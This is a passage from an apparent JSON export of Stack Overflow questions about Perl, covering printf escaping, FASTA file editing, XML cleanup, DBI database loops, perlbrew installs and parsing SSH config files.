Does anyone know what the status is?  How is the experiment working out?</p>\n"},{"tags":["perl","printf"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":62,"score":1,"question_id":12805842,"title":"Why does perl print \"%x\" as a numerical value while reading from a file and writing into another file?","body":"<p>I have this text in file 1:</p>\n\n<pre><code>printf (\"integer value is %x \\n\", a);\n</code></pre>\n\n<p>I want to read data from file 1 and write into file 2. \nWhen I reach this particular line, file 2 appears like this:</p>\n\n<pre><code>printf (\"integer value is 0 \\n\", a);\n</code></pre>\n\n<p>Why does it happen? How can I avoid this?</p>\n\n<p>This is how my Perl code looks:</p>\n\n<pre><code>while ($line = &lt;$in_fh&gt;) {\n    printf $out_fh $line;\n}\n</code></pre>\n\n<p>Here, $in_fh and $out_fh are in &amp; out file handles.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":84,"score":-3,"question_id":12804141,"title":"Self killing Perl script","body":"<p>I need a way to have a perl script to find its own pid and kill itself using the system command. In code:</p>\n\n<pre><code>my $pid = &amp;getScriptPID();\nsystem(\"taskkill $pid\");\n</code></pre>\n\n<p>Is there anyway to do this?</p>\n"},{"tags":["perl","sed","awk","grep"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12796796,"title":"appending characters to end of specific lines in a multifasta file","body":"<p>I have a multifasta file with paired-end reads such that those adjacent to each other are mates (they have the same read name). I want to append \"/1\" and \"/2\" to the first and second read, respectively, throughout the file. I do not know how many reads are in the file. Here is how the file looks like(adding blank lines between reads for clarity):</p>\n\n<blockquote>\n  <p>HWI-ST1018:1:1101:10007:34134#0\n  ACTAGTAACCACATGTCCAGACTCCTCCTATGCTCCCACCCAGGGTCCCTTGAGCTGCTT\n  CCCATTCCCCTAGGGCTGAGACCCAATATCCTCTATCCCTG</p>\n  \n  <p>HWI-ST1018:1:1101:10007:34134#0\n  GTGCAGGCATGTTGGGGCGTGTCTCAGAGCCTGAACTTCCCTTCCAGTCAGTGCTGGAAG\n  GAGGTGGGCAGGGGAATGATAGAAAGGAAGGAGTGGATTGG</p>\n  \n  <p>HWI-ST1018:1:1101:10016:6488#0\n  ACAGCTATACACGAAGAATCTCAGCCCTTGTACTTTTGCATAGTCTCATACACGTATCAG\n  AAGCCTCCACCTGGCTAACAGGAATTTGGGGCTTTGGGAGA</p>\n  \n  <p>HWI-ST1018:1:1101:10016:6488#0\n  TTTGGGAGATTTTTTAATCAGGGCAAAACCTGTACTAGTAACCACATGTCCAGACTCCTC\n  CTATGCTCCCACCCAGGGTCCCTTGAGCTGCTTCCCATTCC</p>\n</blockquote>\n\n<p>And this is how I want it to appear:</p>\n\n<blockquote>\n  <p>HWI-ST1018:1:1101:10007:34134#0/1\n  ACTAGTAACCACATGTCCAGACTCCTCCTATGCTCCCACCCAGGGTCCCTTGAGCTGCTT\n  CCCATTCCCCTAGGGCTGAGACCCAATATCCTCTATCCCTG</p>\n  \n  <p>HWI-ST1018:1:1101:10007:34134#0/2\n  GTGCAGGCATGTTGGGGCGTGTCTCAGAGCCTGAACTTCCCTTCCAGTCAGTGCTGGAAG\n  GAGGTGGGCAGGGGAATGATAGAAAGGAAGGAGTGGATTGG</p>\n  \n  <p>HWI-ST1018:1:1101:10016:6488#0/1\n  ACAGCTATACACGAAGAATCTCAGCCCTTGTACTTTTGCATAGTCTCATACACGTATCAG\n  AAGCCTCCACCTGGCTAACAGGAATTTGGGGCTTTGGGAGA</p>\n  \n  <p>HWI-ST1018:1:1101:10016:6488#0/2\n  TTTGGGAGATTTTTTAATCAGGGCAAAACCTGTACTAGTAACCACATGTCCAGACTCCTC\n  CTATGCTCCCACCCAGGGTCCCTTGAGCTGCTTCCCATTCC</p>\n</blockquote>\n\n<p>I will then grep it, remove the \"--\" separator and save the forward reads (i.e.,those ending in \"/1\") and the reverse reads (i.e., those ending in \"/2\") in different files as follows: </p>\n\n<pre><code>grep -A 2 \"/1\" filename.fa | sed '/--/d' &gt; reads_1.fa\ngrep -A 2 \"/2\" filename.fa | sed '/--/d' &gt; reads_2.fa\n</code></pre>\n\n<p>I think this can be done with sed and awk but I haven't yet figured out how. Please help. Thanks in advance. </p>\n"},{"tags":["windows","perl","pipes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":67,"score":-6,"question_id":12803340,"title":"Using pipe in Windows","body":"<p>I want to filter logs in a file based on time stamp. In Linux, a schedule a thread which cat these files, pipes them on to another script file and will filter the logs within range using regex. If I do same in Windows, in each iteration few logs are missing. Any idea?</p>\n"},{"tags":["xml","perl","awk","xml-serialization","xml-declaration"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12802003,"title":"remove xml declaration from xml Data using perl or awk","body":"<p>Our application is at the receiving-end to do retro-analysis of XML data. Our application doesn't have Java or .NET available, but runs in Unix, so it has awk and Perl.</p>\n\n<p>The XML messages in the file contains:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\" ?&gt; \n</code></pre>\n\n<p>I tried a few options in Perl and awk to get them removed, but couldn't get these to work:</p>\n\n<pre><code>perl -p -i -e \"s/&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\" ?&gt;//g\"  inputFile\nperl -p -i -e \"s/&lt;?xml version=\\\"1.0\\\" encoding=\\\"ISO-8859-1\\\" ?&gt;//g\"  inputFile\nperl -p -i -e \"s/&lt;\\?xml version=\"1.0\" encoding=\"ISO-8859-1\" \\?&gt;//g\"  inputFile\n</code></pre>\n\n<p>Any other option to do this using PERL or AWK?  </p>\n"},{"tags":["perl","wrapper","openembedded"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":10730927,"title":"create_wrapper command not found","body":"<p>I am trying to compile \"perl\" and \"perl-native\" using OpenEmbedded recipes. In my Linux machine, I have perl 5.8.8 installed. When I run \"bitbake perl-native\" it results in an error saying \"create_wrapper command not found\".</p>\n\n<p>I came across this webpage\n<a href=\"http://manpages.ubuntu.com/manpages/maverick/man3/Bio::Tools::Run::Phylo::Hyphy::Base.3pm.html\" rel=\"nofollow\">http://manpages.ubuntu.com/manpages/maverick/man3/Bio::Tools::Run::Phylo::Hyphy::Base.3pm.html</a></p>\n\n<p>which shows the command. But I'm not sure how to incorporate it in my build framework.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":77,"score":2,"question_id":12799907,"title":"How to read multi-line values from a file using Perl","body":"<p>I have a properties file, say</p>\n\n<pre><code>##\n## Start of property1\n##\n##\nProperty1=\\\na:b,\\\na1:b1,\\\na2,b2\n##\n## Start of propert2\n##\nProperty2=\\\nc:d,\\\nc1:d1,\\\nc2,d2\n</code></pre>\n\n<p>Note that the value for any given property may be split across multiple lines.</p>\n\n<p>I want to read this property file using Perl. This works fine in Java, as Java supports multi-line values using the backslash, but in perl it is a nightmare.</p>\n\n<p>In the above properties file there are two properties - <code>Property1</code> and <code>Property2 - each associated with a string which I can split based on the delimiters</code>,<code>and</code>:`</p>\n\n<p>For a given property (say <code>Property1</code>) and given column (say <code>a1</code>) i need to return second column (here <code>b1</code>)</p>\n\n<p>The code should be able to ignore comments, spaces etc.</p>\n\n<p>Thanks in Advance</p>\n"},{"tags":["perl"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":93,"score":-1,"question_id":12798563,"title":"How to test if file ends with }?","body":"<p>I would like to check is my puppet files (.pp) ends with <code>}</code> and with optional <code></code> and newlines.</p>\n\n<p>All I care about is the exit code.</p>\n\n<p>Any ideas how this could be done?</p>\n"},{"tags":["perl","xml-parsing","mod-perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12796841,"title":"Parser error : Opening and ending tag mismatch:","body":"<p>I have a problem reading XML file. If you please look at xml below you see element <code>&lt;fl&gt; ?fl&gt;</code> instead of <code>&lt;fl&gt;&lt;/fl&gt;</code>. I receive error opening and ending tag mismatch.</p>\n\n<p>How to:</p>\n\n<ol>\n<li>There are an errors in XML file such as <code>&lt;fl&gt; ?fl&gt;</code> instead of <code>&lt;fl&gt;&lt;/fl&gt;</code>. How to ignore such error or fix them while reading xml and than use it for parsing?</li>\n<li>I only want to read content from <code>$_-&gt;{desc}-&gt;[0]-&gt;{en}-&gt;[0]</code> and NOT from <code>&lt;de&gt;</code>, <code>&lt;es&gt;</code>, <code>&lt;fl&gt;</code>.</li>\n</ol>\n\n<p>Now I'm reading XML file like:</p>\n\n<pre><code>package test::test6382_sunseekingeurope;\nuse strict;\nuse warnings;\nuse test;\nuse base qw/test/;\nuse URI::URL;\nuse XML::Simple;\nuse Data::Dumper;\nuse constant TASK_ID =&gt; 6382;\nuse constant CR_TYPE =&gt; '6382';\nuse constant IMAGE_PATH =&gt; \"/home/testco/public_html/files/\";#\"images/\";\n\nsub new\n{\nmy $class = shift;\nmy $self = $class-&gt;SUPER::new(CR_TYPE, TASK_ID);\nbless $self, $class;\n\nmy $url = 'http://www.onbip.com/xml/sunseeking9.xml';\n\nmy $xml = $self-&gt;geturl('url'=&gt;$url);\n$self-&gt;extract($xml);\n}\n\nsub extract{\nmy $self = shift;\nmy $xmlfile = shift;\nmy $xml = new XML::Simple(ForceArray=&gt;1,'KeyAttr' =&gt;'image');\nmy $data = $xml-&gt;XMLin($xmlfile);\n\nforeach(@{$data-&gt;{property}}){\n    my $property = &amp;makeScalar($_-&gt;ID-&gt;[0]);\n    my $description = &amp;makeScalar($_-&gt;{desc}-&gt;[0]-&gt;{en}-&gt;[0]);\n</code></pre>\n\n<p>XML:</p>\n\n<pre><code>&lt;property&gt;\n&lt;id&gt;226887&lt;/id&gt;\n&lt;desc&gt;\n &lt;en&gt;\n  Nice house in the center of Alhaurin de la Torre with walking distance to all amenities.\n &lt;/en&gt;\n &lt;es&gt;\n  Bonita casa mata en Alhaurin de la Torre con vistas a la montana, se puede acceder caminando al centro, colegios, etc.\n &lt;/es&gt;\n  &lt;de&gt;\n    guter zustand, bezaubernde immobilie,\n  &lt;/de&gt;\n  &lt;fl&gt;\n    bon n acces par la route, partiellement meubl?a proximit?'?les, partiellement r?v\n  ?fl&gt;\n&lt;/desc&gt;\n&lt;/property&gt;\n</code></pre>\n"},{"tags":["regex","perl","search-and-replace"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":87,"score":2,"question_id":12671067,"title":"Perl regex - can I say 'if character/string matches, delete it and all to right of it'?","body":"<p>I have an array of strings, some of which contain the character '-'. I want to be able to search for it and for those strings that contain it I wish to delete all characters to the right of it.</p>\n\n<p>So for example if I have:</p>\n\n<pre><code>$string1 = 'home - London';\n$string2 = 'office';\n$string3 = 'friend-Manchester';\n</code></pre>\n\n<p>or something as such, then the affected strings would become:</p>\n\n<pre><code>$string1 = 'home';\n$string3 = 'friend';\n</code></pre>\n\n<p>I don't know if the white-space before the '-' would be included in the string afterwards (I don't want it as I will be comparing strings at a later point, although if it doesn't affect string comparisons then it doesn't matter). </p>\n\n<p>I do know that I can search and replace specific strings/characters using something like:</p>\n\n<pre><code>$string1 =~ s/-//\nor \n$string1 =~ tr/-//\n</code></pre>\n\n<p>but I'm not very familiar with regular expressions in Perl so I'm not 100% sure of these. I've looked around and couldn't see anything to do with <code>'to the right of'</code> in regex. Help appreciated!</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12795840,"title":"removing double quotes from a file","body":"<p>I have a tab delimited file, that looks like this.</p>\n\n<pre><code>\"\"\"chr1\"    \"38045559\"  \"38046059\"  \"C1orf122\"\"\"\n\"\"\"\"    \"\"  \"\"  \"C1orf122\"\"\"\n\"\"\"\"    \"\"  \"\"  \"YRDC\"\"\"\n\"\"\"chr1\"    \"205291045\" \"205291545\" \"YOD1\"\"\"\n\"\"\"chr1\"    \"1499717\"   \"1500625\"   \"SSU72\"\"\"\n</code></pre>\n\n<p>I got this file after converting a .csv to tab separated file from this command </p>\n\n<pre><code>perl -lpe 's/\"/\"\"/g; s/^|$/\"/g; s/\",\"/\\t/g' &lt;test.csv&gt;test_tab\n</code></pre>\n\n<p>Now, I want my file to remain tab separated but all the extra quotes should be removed from the file. But at the same time when I print column 4 I should get all the names and for column 1,2, and 3 the co ordinates (this I still get it but with quotes).</p>\n\n<p>What manipulation shall I do in above command to do so, kindly guide.</p>\n\n<p>The output desired is (since I was asked to be clear)</p>\n\n<pre><code>chr1    38045559    38046059    C1orf122\n                                C1orf122\n                                YRDC\nchr1    205291045   205291545   YOD1\nchr1    1499717     1500625     SSU72\n</code></pre>\n\n<p>so that when I extract Column 4 I should get</p>\n\n<pre><code>    C1orf122\n    C1orf122\n    YRDC \n    YOD1\n    SSU72\n</code></pre>\n\n<p>Thank you</p>\n"},{"tags":["perl","dbix-class"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":52,"score":3,"question_id":12796585,"title":"Can DBIx::Class be used to create tables?","body":"<p>I do not think I understand the scope of <code>DBIx::Class</code><br>\nDo I have to manually create a database with regular SQL first, then use the schemaloader (or manually code the schema/resultsets)?<br>\nOr is there a way to tell <code>DBIx::Class</code> to go ahead and create the tables from a manually coded schema and resultset?<br>\nI ask b/c if I need to create the database via SQL <code>CREATE TABLE</code> statement, I have the column essentially duplicated in the ResultSet code, OR I need to rely on schemaloader which I assume is inefficient and inappropriate for production.</p>\n"},{"tags":["xml","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":39,"score":-1,"question_id":12795832,"title":"Perl script to modify xml file contents","body":"<p>I have got some .xml files with different contents inside them. I wanted to make changes by using perl script to modify</p>\n\n<p>OLD:</p>\n\n<pre><code>enter code here&lt;package&gt;\n        enter code here&lt;package&gt;plugin-core-isam-r4.2-1.0_9.2.10-169472&lt;/package&gt;\n        enter code here&lt;revision&gt;169472&lt;/revision&gt;\n        enter code here&lt;some other contents&gt;\nenter code here&lt;/package&gt;\n</code></pre>\n\n<p>NEW:</p>\n\n<pre><code>enter code here&lt;package&gt;\n        enter code here&lt;package&gt;plugin-core-isam-r4.2-1.0_9.2.10-169472&lt;/package&gt;\n        enter code here&lt;revision&gt;169472&lt;/revision&gt;\n        enter code here&lt;some other contents&gt;\nenter code here&lt;/package&gt;\n</code></pre>\n\n<p>Please suggest to take it further</p>\n"},{"tags":["perl","list","ssh","sftp"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":12779891,"title":"How do I list file in time order using the SFTP module of NET::SSH2 in Perl?","body":"<p>I am using SFTP through the NET::SSH2 package in Perl.\nListing files in a folder works good using the opendir function.</p>\n\n<p>I would like to have the files in time order with the latest modified file last.\nIs that possible and how?</p>\n"},{"tags":["perl"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12791672,"title":"How to properly use filepath with arguments spaces in them, in Perl?","body":"<p>Looking to open a file at <code>'\"E:\\\\Program Files (x86)\\\\Vim\\\\vim73\\\\gvim.exe -f \" %s\" \"'</code> and I'm getting <code>Cannot find e:\\Program</code>.</p>\n\n<p>What do I need to do to get it to work?</p>\n\n<p><em>edit</em>:  Here's the <a href=\"http://pastebin.com/jgYuixke\" rel=\"nofollow\">script</a> I am trying to get working (it's the full script as I'm not yet familar with perl at all, sorry). It's supposed to launch gvim when I make a POST request to the server via chrome's TextAid. Check out line 38</p>\n"},{"tags":["database","arrays","perl","database-connection","sybase"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12789503,"title":"Looping through two databases of the same type, but different ips not working as intended","body":"<p>I have searched online for a solution to this, but have been unable to get the results I need on google, nor did I find it in the cpan sybase driver details. Feedback would be greatly appreciated! </p>\n\n<p>I'm using perl to connect to two Sybase databases, each on different hosts (but same user/pass) (The ip's and ports are in the sybase conf file and given a name \"server1\" and \"server2\") </p>\n\n<p>when I try to loop the connection from an array, (not including all the code on purpose!)</p>\n\n<pre><code>my @b_dsn      = ('DBI:Sybase:server=server1', 'DBI:Sybase:server=server2');  \nmy @b_switch   = ('A','B'); \nmy @b_filename = ('port_query');\n\nfor $j (0..$#b_dsn) {   \n\n    for $i (0..$#b_query_list) {  \n\n        print \"\\nConnection[$j] = $b_dsn[$j] switch= $b_switch[$j]\";\n        $dbh = DBI-&gt;connect($b_dsn[$j],$b_userid,$b_passwd) or $logger-&gt;logdie (\"Error: unable to connect to server $DBI::errstr\") unless $dbh;\n\n        my $outpath = \"$output_path/${b_filename[$i]}_$b_switch[$j].csv\";\n        print \"\\noutpath created  = $outpath\\n\";\n\n        $dbh-&gt;do(\"use thisdb\");\n\n        my $query = $b_query_list[$i];\n\n        $sth = $dbh-&gt;prepare ($query) or $logger-&gt;logdie (\"prepare failed\\n\");\n        $sth-&gt;execute( ) or $logger-&gt;logdie (\"unable to execute query $query  error $DBI::errstr\");\n\n        $rows = $sth-&gt;rows;\n\n        open (my $outfile, \"&gt;$outpath\") or $logger-&gt;logdie(\"Error: Can't open $outpath. It may be open.:$!\");\n\n        while (@row = $sth-&gt;fetchrow_array ) \n            {foreach (@row) {$_ = '' unless defined};\n             print ($outfile join(\",\", map{ qq/\"$_\"/} @row), \"\\n\");\n            }   \n\n        close ($outfile) or $logger-&gt;logwarn (\"$outfile close failed.It may be in use: $!\");\n        END { $dbh-&gt;disconnect if defined($dbh); }\n    }\n}\n</code></pre>\n\n<p>I get the correct filenames and connections:</p>\n\n<pre><code>Connection = DBI:Sybase:server=server1 type= FA\noutpath created  = /csv/port_query_FA.csv\n\nConnection = DBI:Sybase:server=server2 type= FB\noutpath created  = /csv/port_query_FB.csv\n</code></pre>\n\n<p>But the data in both of the query files are only \"FA\". </p>\n\n<p>When separated, (ie, a separate subroutine for each connection) I get the results and data that I want. I gathered from this that the connection doesn't close before starting onto the second one, but is there a way to fix that and keep them in one subroutine?  Is a small internal delay the answer? Sounds incomplete to me, any other ideas?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12790643,"title":"Perl :: Convert utf-8 into html &...;","body":"<p>In Perl, how can I convert string containing utf-8 characters to HTML where such characters will be converted into <strong>&amp;...;</strong> ?</p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":3665,"score":2,"question_id":3192649,"title":"How can I remove leading and trailing whitespaces from array elements?","body":"<p>I have an array that contains string which may contain whitespaces appended to the end. I need to remove those spaces using perl script. my array will look like this</p>\n\n<pre><code>@array = (\"shayam    \",\" Ram        \",\" 24.0       \");\n</code></pre>\n\n<p>I need the output as </p>\n\n<pre><code>@array = (\"shayam\",\"Ram\",\"24.0\");\n</code></pre>\n\n<p>I tried with <code>chomp (@array)</code>. It is not working with the strings.</p>\n"},{"tags":["perl","file-handling"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12793121,"title":"Read and Write to the same file in Perl","body":"<p>This is in continuation with this -><a href=\"http://stackoverflow.com/questions/12633743/read-and-write-to-a-file-in-perl\">Read and Write to a file in perl</a> question.</p>\n\n<p>The following code worked perfectly fine for reading and writing to the same file:</p>\n\n<pre><code>use Tie::File;\nuse strict;\nuse warnings;\n\nmy $filename = \"out.txt\";\nmy @array;\ntie @array, 'Tie::File', $filename\n    or die \"can't tie file \\\"$filename\\\": $!\";\n\nfor my $line (@array) {\n\n    $line = \"&lt;$line&gt;\";\n}\nuntie @array;\n</code></pre>\n\n<p>But when I did the following the changes were not reflected in the file :</p>\n\n<pre><code>use Tie::File;\nuse strict;\nuse warnings;\n\nmy $filename = \"out.txt\";\nmy @array;\ntie @array, 'Tie::File', $filename\n    or die \"can't tie file \\\"$filename\\\": $!\";\n\nmy $len = @array;\nfor ($i = 0; $i &lt; $len ; $i++) {\n\n    $line = $array[$i];\n    $line = \"&lt;$line&gt;\";     \n}\nuntie @array;\n</code></pre>\n\n<p>Can someone help me with this problem ?\nYes I know I can use the for loop above, knowing this may help me solve some other problems too.\nThank you.</p>\n"},{"tags":["perl","selenium","internet-explorer-10"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12793236,"title":"SeleniumRC+Perl+IE10 \"type\" command is not working","body":"<p>I am trying to run my script with \"type\" command against IE10 but it returns \"element not found\"</p>\n\n<p>I have tried the \"focus\" command and it did recognize the element.</p>\n\n<pre><code>$sel-&gt;type(\"locator\", \"value\");\n</code></pre>\n\n<p>I also run my script against IE9 and IE8 and it works perfectly fine.<br>\nIs selenium rc compatible with IE10?</p>\n"},{"tags":["perl","memory"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12308619,"title":"Is there a way to record maximum memory used running in PERL","body":"<p>As I said, I want to record the max memory used during program run time.</p>\n"},{"tags":["perl","perlbrew"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":12788174,"title":"Installing ancient perls with Perlbrew","body":"<p>I'm trying to use <code>perlbrew</code> to install some older Perls. I believe it's failing due to the old-style version numbers. According to <code>perlbrew available</code>:</p>\n\n<pre><code>  perl-5.14.3-RC1\n  perl-5.16.1\n  perl-5.14.2\n  perl-5.12.4\n  perl-5.10.1\n  perl-5.8.9\n  perl-5.6.2\n  perl5.005_04\n  perl5.004_05\n  perl5.003_07\n</code></pre>\n\n<p>However, when I run <code>perlbrew install perl5.003_07</code>, I get:</p>\n\n<pre><code> Unknown installation target \"perl5.003_07\", abort. Please see\n `perlbrew help` for the instruction on using the install command.\n</code></pre>\n\n<p>If I try it by giving a direct link to the tarball, e.g. <code>perlbrew install http://www.cpan.org/src/5.0/perl5.005_03.tar.gz</code>, it downloads the tarball but the regex for parsing the version number fails:</p>\n\n<pre><code>Use of uninitialized value $dist_version in concatenation (.) or string at /usr/local/share/perl5/App/perlbrew.pm line 686.\nFetching perl- as /home/cpanci/perl5/perlbrew/dists/perl5.005_03.tar.gz\nUse of uninitialized value $dist_version in pattern match (m//) at /usr/local/share/perl5/App/perlbrew.pm line 925.\nInstalling /home/cpanci/perl5/perlbrew/build/perl5.005_03 into ~/perl5/perlbrew/perls/perl-\n\nThis could take a while. You can run the following command on another shell to track the status:\n\n  tail -f ~/perl5/perlbrew/build.perl-.log\n\nUse of uninitialized value $dist_version in pattern match (m//) at /usr/local/share/perl5/App/perlbrew.pm line 952.\nUse of uninitialized value $dist_version in pattern match (m//) at /usr/local/share/perl5/App/perlbrew.pm line 969.\n\nInstalling /home/cpanci/perl5/perlbrew/build/perl5.005_03 failed. Read /home/cpanci/perl5/perlbrew/build.perl-.log to spot any\nissues. \n</code></pre>\n\n<p>Any ideas? It's working fine for newer perls.</p>\n\n<p>This is with App::perlbrew version 0.52.</p>\n"},{"tags":["c++","perl","make","symbian","qt-creator"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1389,"score":1,"question_id":4538672,"title":"Slow building of a Symbian Qt Project in Qt Creator. Takes over 20 minutes","body":"<p>I'm trying to build a moderately sized Symbian Qt project (around 100 files) using the latest released Nokia Qt SDK (Qt 4.6.3 and Qt Mobility 1.0.2).</p>\n\n<p>The build for the simulator finishes in under 3 minutes, but when I build for the device, the build takes well over 20 minutes! I can forget trying to debug on the device. It is very frustrating!</p>\n\n<p>My machine specs are the following:\nWindows 7 32-bit\n3.24GB RAM\nIntel Core 2 Duo 1.86GHz</p>\n\n<p>The compiler has been stuck here for over 10 minutes:</p>\n\n<pre><code>Running build steps for project AppName...\nStarting: \"c:/nokiaqtsdk/symbian/sdk/bin/qmake.exe\" C:/QtProjects/AppName/AppName.pro -r -spec symbian-abld -after OBJECTS_DIR=obj MOC_DIR=moc UI_DIR=ui RCC_DIR=rcc CONFIG+=release\nThe process \"c:/nokiaqtsdk/symbian/sdk/bin/qmake.exe\" exited normally.\nStarting: \"C:/NokiaQtSDK/Symbian/SDK/epoc32/tools/make.exe\" release-gcce -w\nC:\\NokiaQtSDK\\Symbian\\SDK\\epoc32\\tools\\make.exe: Entering directory `C:/QtProjects/AppName'\n\nbldmake bldfiles\n\nABLD.BAT build gcce urel\n\nmake -r -f \"\\NokiaQtSDK\\Symbian\\SDK\\EPOC32\\BUILD\\QtProjects\\AppName\\EXPORT.make\" EXPORT VERBOSE=-s\n\nmake[1]: Entering directory `C:/QtProjects/AppName'\n\nNothing to do\n\nmake[1]: Leaving directory `C:/QtProjects/AppName'\n\nmake -r -f \"\\NokiaQtSDK\\Symbian\\SDK\\EPOC32\\BUILD\\QtProjects\\AppName\\GCCE.make\" MAKEFILE VERBOSE=-s\n\nmake[1]: Entering directory `C:/QtProjects/AppName'\n\nmake -s -C \\QtProjects\\AppName-f \"MAKEFILE_0Xe001827C.MK\" TO_ROOT=..\\.. EPOCBLD=\\NokiaQtSDK\\Symbian\\SDK\\EPOC32\\BUILD\\MAKEFILE_0Xe001827C\\GCCE TO_BLDINF=..\\..\\QtProjects\\AppNamePLATFORM=GCCE MAKMAKE\n\nperl -S makmake.pl -D \\QtProjects\\AppName\\APPNAME_0Xe001827C GCCE \n\nWARNING: \\QtProjects\\AppName\\APPNAME_0Xe001827C .MMP(65) : SYSTEMINCLUDE path \"\\NokiaQtSDK\\Symbian\\SDK\\epoc32\\include\\osextensions\\stdapis\\\" not found\n\n\n\nWARNING: \\QtProjects\\AppName\\APPNAME_0Xe001827C .MMP(66) : SYSTEMINCLUDE path \"\\NokiaQtSDK\\Symbian\\SDK\\epoc32\\include\\osextensions\\stdapis\\sys\\\" not found\n\n\n\nWARNING: \\QtProjects\\AppName\\APPNAME_0Xe001827C .MMP(69) : SYSTEMINCLUDE path \"\\NokiaQtSDK\\Symbian\\SDK\\epoc32\\include\\oem\\\" not found\n\n\n\nWARNING: \\QtProjects\\AppName\\APPNAME_0Xe001827C .MMP(72) : SYSTEMINCLUDE path \"\\NokiaQtSDK\\Symbian\\SDK\\epoc32\\include\\osextensions\\\" not found\n\n\n\nWARNING: \\QtProjects\\AppName\\APPNAME_0Xe001827C .MMP(73) : SYSTEMINCLUDE path \"\\NokiaQtSDK\\Symbian\\SDK\\epoc32\\include\\domain\\osextensions\\\" not found\n\n\n\nWARNING: \\QtProjects\\AppName\\APPNAME_0Xe001827C .MMP(74) : SYSTEMINCLUDE path \"\\NokiaQtSDK\\Symbian\\SDK\\epoc32\\include\\domain\\osextensions\\loc\\\" not found\n\n\n\nWARNING: \\QtProjects\\AppName\\APPNAME_0Xe001827C .MMP(76) : SYSTEMINCLUDE path \"\\NokiaQtSDK\\Symbian\\SDK\\epoc32\\include\\domain\\osextensions\\loc\\sc\\\" not found\n\n\n\nWARNING: \\QtProjects\\AppName\\APPNAME_0Xe001827C .MMP(77) : SYSTEMINCLUDE path \"\\NokiaQtSDK\\Symbian\\SDK\\epoc32\\include\\domain\\middleware\\loc\\sc\\\" not found\n\n\n\nWARNING: \\QtProjects\\AppName\\APPNAME_0Xe001827C .MMP(82) : SYSTEMINCLUDE path \"\\NokiaQtSDK\\Symbian\\SDK\\epoc32\\include\\osextensions\\stdapis\\stlport\\\" not found\n\n\n\n\n\nMMPFILE \"\\QtProjects\\AppName\\APPNAME_0Xe001827C .MMP\"\n</code></pre>\n"},{"tags":["sql","perl","dbi"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12773109,"title":"Using Perl ? bind inside single quotes","body":"<p>This scripts works fine for all commands that don't require % wildcards. When I attempt to wrap the ? in %?% which producing a bind error. Also I have tried adding %value% to the argument when running the script and it also producing the same error. Is there a way to substitue an argument into a SQL DBI command in perl?</p>\n\n<p>Thanks, in advance.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse DBI;\nuse Text::Diff;\nuse File::stat;\nuse Fcntl ':flock';\n\nopen (LOCK_FH, $0) || die \"$0 for lock: $!\\n\";\nflock (LOCK_FH, LOCK_EX|LOCK_NB) || die \"$0 already running\\n\";\n\n$BINDVAR = $ARGV[0];\n$dbname = \"COnnectionDetailsHere\";\n$un = \"username\";\n$pw = \"password\";\n\nmy $dbh = DBI-&gt;connect ( $dbname, $un, $pw, { PrintError=&gt;1, RaiseError=&gt;1, AutoCommit=&gt;0, LongReadLen=&gt;5056}) or die \"Couldn't connect to DB: \" . DBI-&gt;errstr;\n\n$sql = &lt;&lt;SQL\n\nselect * from foo where bar like '%?%' '?'\n\nSQL\n;\n\n$stm = $dbh-&gt;prepare($sql) or die \"SQL failed to prepare $DBI::errstr\\n\";\n\n$stm-&gt;bind_param(1,($BINDVAR));\n\n$stm-&gt;execute() or die \"Couldn't execute the statement: \" . $stm-&gt;errstr;\n</code></pre>\n"},{"tags":["regex","perl","bash","sed","awk"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":12779134,"title":"Parsing .ssh/config for proxy information","body":"<p>I would like to parse the <code>.ssh/config</code> file for proxy information contained therein and display each host that has related proxy information with the proxy information. Hosts that do not have any proxy information should be filtered out. Man page for <code>.ssh/config</code>: <a href=\"http://man-wiki.net/index.php/5:ssh_config\" rel=\"nofollow\">http://man-wiki.net/index.php/5:ssh_config</a></p>\n\n<p>This should be done from a Unix shell script under Bash, so a standard tool like Perl, awk or sed is preferred.</p>\n\n<p>Example input 